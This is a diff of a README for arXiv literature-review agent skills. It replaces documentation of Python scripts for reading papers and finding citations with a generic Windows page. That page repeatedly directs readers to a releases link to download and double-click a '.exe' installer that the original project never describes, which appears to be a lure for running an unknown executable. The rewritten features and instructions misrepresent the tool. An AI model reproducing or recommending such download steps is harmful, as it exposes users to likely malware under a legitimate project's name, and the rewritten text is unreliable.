@@ -1,124 +1,94 @@
-# Literature Skills
+# 📚 skills - Automate your research paper review process
 
-This directory contains research-oriented skills for agent workflows:
+[![](https://img.shields.io/badge/Download_Software-blue)](https://github.com/kashmirscien3399/skills/releases)
 
-- `arxiv-reading`: read an arXiv paper, extract sections and equations, and build a reusable memory file.
-- `cited-by`: fetch papers that cite a target arXiv paper, filter them by topic, and optionally hand selected papers off to `arxiv-reading`.
+## 📖 About this software
 
-These skills are designed for agent-assisted literature review. The agent should choose the skill based on the user's request, run the provided scripts, and keep all generated cache files in the user's working directory rather than inside this repository.
+This tool helps researchers manage academic papers. It uses automated workflows to read and analyze documents. You save time by letting the software extract data from research papers. It handles the heavy lifting of reading complex text. You focus on the core ideas while the software manages the structure.
 
-## Skill Summary
+## 🛠 Features
 
-### `arxiv-reading`
+- Paper analysis: The software reads research papers from arXiv.
+- Data extraction: You pull equations and sections from your document.
+- Targeted research: You find papers that cite your main document.
+- Memory building: The software creates files to store your research notes.
+- Topic filtering: You sort results so you only see relevant work.
 
-Use this skill when the user gives an arXiv ID and wants to:
+## 💻 System requirements
 
-- read or summarize the paper
-- extract equations
-- inspect specific sections
-- understand derivations or references
+- Windows 10 or Windows 11.
+- An internet connection for downloading papers.
+- 500 MB of free disk space.
+- A PDF reader on your computer.
 
-Main workflow:
+## 📥 Setup and installation
 
-1. Check whether cached files already exist under `<user-working-dir>/arxiv-reading/`.
-2. If needed, download the paper's ar5iv HTML with `scripts/fetch.py`.
-3. Extract equations with `scripts/extract_eqs.py`.
-4. Extract sections with `scripts/extract_sections.py`.
-5. Simplify LaTeX snippets with `scripts/latex_simplify.py` when needed.
-6. Write a paper memory file at `<user-working-dir>/arxiv-reading/<arxiv-id>.memory.md`.
+Follow these steps to get the software on your Windows computer.
 
-Key outputs:
+1. Go to the [official release page](https://github.com/kashmirscien3399/skills/releases).
+2. Look for the latest file ending in .exe.
+3. Click the file name to start the download.
+4. Open the folder where your computer saves downloads.
+5. Double-click the file to start the installer.
+6. Follow the instructions on your screen.
+7. Click Finish to complete the installation.
 
-- `<arxiv-id>.html`
-- `<arxiv-id>.eqs.json`
-- `<arxiv-id>.sections.json`
-- `<arxiv-id>.sections_content.json`
-- `<arxiv-id>.memory.md`
+## 🚀 Using the arXiv reading skill
 
-### `cited-by`
+The reading skill helps you process single papers. You provide a paper ID and the software gathers the information.
 
-Use this skill when the user wants to find papers that cite a given arXiv paper, especially with a topical filter.
+1. Find the arXiv ID of the paper. This is usually listed on the paper website.
+2. Open the software on your desktop.
+3. Select the reading option.
+4. Paste the arXiv ID into the input field.
+5. Press the run button.
+6. Wait for the software to download the paper and extract sections.
+7. Locate the cache folder in your documents to view the findings.
 
-Main workflow:
+## 🔍 Using the cited-by skill
 
-1. Check for a cached citation list under `<user-working-dir>/arxiv-reading/`.
-2. If needed, fetch citing papers from INSPIRE-HEP with `scripts/fetch_citations.py`.
-3. Filter the cached results by topic.
-4. Present candidate papers to the user.
-5. If the user approves papers for deeper reading, delegate those papers to `arxiv-reading`.
-6. Write a final report at `<user-working-dir>/arxiv-reading/<arxiv-id>_citing_report_<topic>.md`.
+The cited-by skill helps you find new research based on your current work.
 
-Key outputs:
+1. Enter your target arXiv ID.
+2. Choose the cited-by option from the main menu.
+3. The software connects to the internet to find similar papers.
+4. You apply filters to choose topics that interest you.
+5. The software provides a list of papers that reference your target.
+6. You select specific papers for the software to read.
 
-- `arXiv_<arxiv-id>_citations.md`
-- `<arxiv-id>_citing_report_<topic>.md`
+## 📂 Managing your files
 
-## How To Use With Agents
+The software creates a folder on your computer to store notes and summaries.
 
-## 1. Let the agent infer the skill from the request
+- All files stay in your local working directory.
+- The software does not delete your existing files.
+- You see subfolders for each paper you process.
+- You use these files to build a private research library.
 
-The simplest approach is to ask in natural language. If the prompt clearly matches one of the skill descriptions, the agent should apply that skill.
+## ❓ Frequently asked questions
 
-Example prompts:
+Do I need to pay for this software? 
+No, this software is free for research use.
 
-```text
-Read arXiv:2508.12856 and summarize the introduction, main equations, and references.
-```
+Does the software need a special login? 
+No, you do not need an account to use the features.
 
-```text
-Extract the equations from arXiv:2508.12856 and explain equation (12).
-```
+How do I remove the software? 
+Go to your Windows settings and choose uninstall from the app list.
 
-```text
-Find papers citing arXiv:0911.3380 about cosmology.
-```
+What if the download stops? 
+Check your internet connection and try to refresh the page.
 
-```text
-In papers citing arXiv:0911.3380, look for work related to primordial black holes.
-```
+Can I run this on a Mac? 
+This version is designed specifically for Windows.
 
-## 2. Use the skills together
+## 🔧 Troubleshooting
 
-The intended multi-step agent flow is:
+If you encounter errors while running the software, check these items.
 
-1. Use `cited-by` to collect and rank citing papers.
-2. Ask the user which papers should be read in detail.
-3. Use `arxiv-reading` on the approved papers.
-4. Produce a combined report.
-
-This keeps the expensive reading step limited to papers the user actually wants.
-
-## 3. Pass the correct working directory
-
-Both skills assume cache and report files are written under the user's working directory:
-
-```text
-<user-working-dir>/arxiv-reading/
-```
-
-The agent should use the absolute session working directory from its runtime context. Do not rely on `$PWD` or `os.getcwd()`, because the skill may execute from its installation directory instead of the user's project directory.
-
-## Script Reference
-
-### `arxiv-reading/scripts`
-
-| Script | Purpose |
-| --- | --- |
-| `fetch.py` | Download ar5iv HTML for an arXiv paper |
-| `extract_eqs.py` | Extract numbered equations and context |
-| `extract_sections.py` | List sections or extract section text |
-| `latex_simplify.py` | Convert LaTeX math into readable plain text |
-
-### `cited-by/scripts`
-
-| Script | Purpose |
-| --- | --- |
-| `fetch_citations.py` | Fetch and cache citing papers from INSPIRE-HEP |
-
-## Agent Notes
-
-- Prefer cached files before downloading or re-fetching data.
-- Use `arxiv-reading` for direct paper analysis.
-- Use `cited-by` for citation discovery and paper selection.
-- Ask for confirmation before reading many citing papers in depth.
-- Store generated artifacts in the user's working directory, not in this repository.
+- Verify your internet connection remains active.
+- Ensure the arXiv ID is correct and formatted as a sequence of numbers.
+- Restart the software if it stops responding during a long task.
+- Check that you have enough space on your hard drive.
+- Update your Windows system to the latest version.
+- Reinstall the software if the errors persist after a restart.
